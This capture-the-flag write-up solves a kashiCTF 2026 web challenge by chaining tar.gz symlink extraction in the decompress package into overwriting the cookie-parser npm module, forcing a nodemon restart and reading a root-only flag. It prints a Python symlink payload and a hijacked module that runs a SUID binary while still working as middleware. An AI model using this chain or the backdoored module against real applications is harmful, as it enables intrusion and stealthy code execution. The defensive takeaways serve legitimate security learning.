# Cloud Backup

**CTF**: kashiCTF 2026
**Category**: Web/Misc
**Flag**: `kashiCTF{19a0f28ae45d635a23a430802f7d4865nTlHnqFNFn}}`

## TL;DR

Tar.gz symlink extraction → write through symlink to overwrite `cookie-parser` npm module with malicious code that executes SUID `/sayhi` binary → trigger nodemon restart via `.node` file → flag written to `/tmp/flag.txt` on server boot → read via second symlink.

## Analysis

### Reconnaissance

Express/Node.js cloud backup app with JWT auth, file upload/download, and `.tar.gz` extraction via the `decompress` npm package (v4.2.0).

Key observations from source code (read via symlink LFI):
- **Dockerfile**: Compiles a SUID root binary `/sayhi` from `sayhi.c` that reads `/flag`
- **`sayhi.c`**: Simply `fopen("/flag", "r")` and prints contents
- **`docker-entrypoint.sh`**: Writes flag to `/flag`, then runs `sudo -u nodejs npm run dev`
- **App runs as `nodejs`** (non-root) — cannot read `/flag` directly
- **nodemon config**: `"ext": "node"` and `"ignoreRoot": [".git"]` — watches for `.node` file changes, and critically does NOT ignore `node_modules/`
- **`decompress` v4.2.0**: Extracts tar.gz symlinks and follows them when writing subsequent files

### Path Traversal via Symlink (CWE-59)

The upload handler extracts `.tar.gz` files using `decompress(tempPath, targetPath)` which preserves symlinks. The `isSafePath()` check only validates the API-level `path` parameter, not the internal tar contents. This allows:

1. Upload a tar containing a symlink → symlink is created inside user's upload directory
2. Upload a regular file with `targetDir` set to the symlink name → file is written through the symlink to the target location

### Why directory symlinks crash the server

The `getDirectorySize()` function recursively traverses the user directory using `fs.stat()` (which follows symlinks). A symlink to `/app/` creates an infinite loop: `uploads/USER_ID/symlink → /app/ → uploads/ → USER_ID/ → symlink → ...` causing a stack overflow crash.

Symlinks to subdirectories NOT in the path from `/` to the user directory (like `/app/node_modules/cookie-parser/`) work fine — no recursion.

### RCE via Module Hijacking

Can't overwrite `/app/server.js` (root-owned, 644). But `node_modules/` is owned by `nodejs` (created by `npm install` after `USER nodejs`). Overwriting a dependency module gets code execution on next server restart.

## Exploitation

### Step 1: Read source code (symlink LFI)

Upload tar.gz files containing symlinks to specific files, then download through them:

```
symlink → /app/server.js     → read full source
symlink → /app/Dockerfile    → discover /sayhi SUID binary
symlink → /app/sayhi.c       → confirm it reads /flag
symlink → /app/package.json  → identify dependencies
```

### Step 2: Symlink to cookie-parser module

```python
# Upload tar with symlink: cp -> /app/node_modules/cookie-parser
info = tarfile.TarInfo(name='cp')
info.type = tarfile.SYMTYPE
info.linkname = '/app/node_modules/cookie-parser'
tar.addfile(info)
```

### Step 3: Overwrite cookie-parser/index.js

Upload `index.js` with `targetDir=cp` — writes through symlink to `/app/node_modules/cookie-parser/index.js`:

```javascript
const { execSync } = require('child_process');
const fs = require('fs');

// Executes on require() during server startup
try {
  const flag = execSync('/sayhi').toString();
  fs.writeFileSync('/tmp/flag.txt', flag);
} catch(e) {}

// Must export working middleware or server crashes and auth breaks
module.exports = function(secret, options) {
  return function cookieParser(req, res, next) {
    if (req.cookies) return next();
    var cookies = {};
    var header = req.headers.cookie;
    if (header) {
      header.split(';').forEach(function(cookie) {
        var parts = cookie.split('=');
        cookies[parts[0].trim()] = decodeURIComponent(parts.slice(1).join('=').trim());
      });
    }
    req.cookies = cookies;
    req.signedCookies = {};
    next();
  };
};
```

Critical: the replacement must export a functioning cookie-parser middleware. Without it, `req.cookies` is undefined, `authenticateToken` crashes on `req.cookies.token`, and all authenticated endpoints (including file download) return 500 — locking you out of reading the flag.

### Step 4: Trigger nodemon restart

Upload `restart.node` to the same `cp` directory. Because `ignoreRoot: [".git"]` replaces the default ignore list (which normally includes `node_modules`), nodemon detects the `.node` file change in `node_modules/cookie-parser/` and restarts the server.

### Step 5: Read the flag

After restart, `require('cookie-parser')` loads our malicious module, which executes `/sayhi` (SUID root → reads `/flag`) and writes the output to `/tmp/flag.txt`.

Register a new user (in-memory user DB was cleared on restart), upload a symlink to `/tmp/flag.txt`, and download it.

## Key Takeaways

- **tar.gz symlink extraction** is a classic attack (CWE-59) — always validate extracted paths and reject symlinks
- **`decompress` v4.2.0** does not sanitize symlinks — upgrade to v4.2.1+
- **nodemon `ignoreRoot`** replaces defaults — setting it to `[".git"]` removes the `node_modules` ignore, making module overwrites trigger restarts
- **SUID binaries in containers** are dangerous — the intended isolation (non-root user) is defeated by any file write primitive
- **Module hijacking**: overwriting `node_modules/` dependencies is as powerful as overwriting the app itself, and often has weaker file permissions
- **Cookie-parser replacement must work**: breaking middleware locks you out of the very endpoints needed to exfiltrate data — always maintain functionality when hijacking modules

## Files

- `exploit_final.py` — Full exploit script
- `flag.txt` — Captured flag
